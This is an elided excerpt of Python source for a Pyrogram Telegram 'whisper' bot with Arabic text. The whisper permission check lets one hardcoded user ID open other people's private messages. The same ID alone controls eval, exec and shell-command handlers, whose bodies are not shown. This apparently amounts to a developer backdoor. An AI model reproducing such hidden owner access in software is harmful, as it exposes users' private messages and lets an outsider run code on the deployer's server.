...
async def open_hms(c: Client, m: Message):
   ...
   if not wsdb.get(f"hms-{id}"):
      ...
      # التحقق من الصلاحية
      if m.from_user.id != to and m.from_user.id != sender and m.from_user.id != 7598650992:
         try:
...
def private_func(c,m,k):
  ...
  if text == '/start':
    ...
    reply_markup = InlineKeyboardMarkup([
        [
            InlineKeyboardButton('Abu Hamza', url='https://t.me/FFJFF5'),
            InlineKeyboardButton('Source', url='https://t.me/EgyCodes')
        ],
        [
...
- في حال انك بالتوب واسمك مزخرف راح يصفيه البوت تلقائي''',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (f"Channel Source", url=f't.me/{channel}')]]))
  ...
  if text == '/start' and dev_pls(m.from_user.id,m.chat.id):
     ...
     if m.from_user.id == 7598650992 or m.from_user.id == 7598650992:
       rank = 'المبرمج ابو حمزه'
     else:
...
@Client.on_message(filters.command("eval") & filters.user(7598650992))
...
@Client.on_message(filters.command("exec") & filters.user(7598650992))
...
@Client.on_message(filters.command("cmd") & filters.user(7598650992))
...
@Client.on_message(filters.command("print") & filters.user(7598650992))
...
@Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(7598650992))
